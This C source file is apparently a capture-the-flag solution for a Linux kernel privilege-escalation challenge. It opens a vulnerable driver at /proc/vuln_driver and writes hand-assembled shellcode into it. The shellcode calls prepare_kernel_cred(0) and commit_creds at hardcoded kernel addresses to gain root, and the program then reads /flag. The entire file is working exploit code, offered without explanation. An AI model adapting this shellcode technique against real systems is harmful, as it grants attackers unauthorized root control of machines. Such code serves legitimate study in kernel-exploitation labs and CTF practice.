#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

uint64_t prepare_kernel_cred = 0xffffffff810890d0;
uint64_t commit_creds = 0xffffffff81088d90;

int64_t global_fd;
char global_buf[1024];
char driver[] = "/proc/vuln_driver";

void open_driver() {
        global_fd = open(driver, O_RDWR);
        if (global_fd < 0) {
                printf("[+] Failed to open driver :(\n");
                exit(1);
        } else {
                printf("[+] Driver open\n");
        }
}

void read_flag() {
        global_fd = open("/flag", O_RDONLY);
        read(global_fd, global_buf, sizeof(global_buf));
        close(global_fd);
        printf("%s\n", global_buf);
}

int main() {
        open_driver();
        char payload[] = { 
                0x48, 0x31, 0xff,
                0x48, 0xc7, 0xc0, 0xd0, 0x90, 0x08, 0x81, 
                0xff, 0xd0,
                0x48, 0x89, 0xc7,
                0x48, 0xc7, 0xc0, 0x90, 0x8d, 0x08, 0x81,
                0xff, 0xd0,
                0xc3 };

        write(global_fd, payload, sizeof(payload));
        close(global_fd);
        read_flag();
        return 0;
}
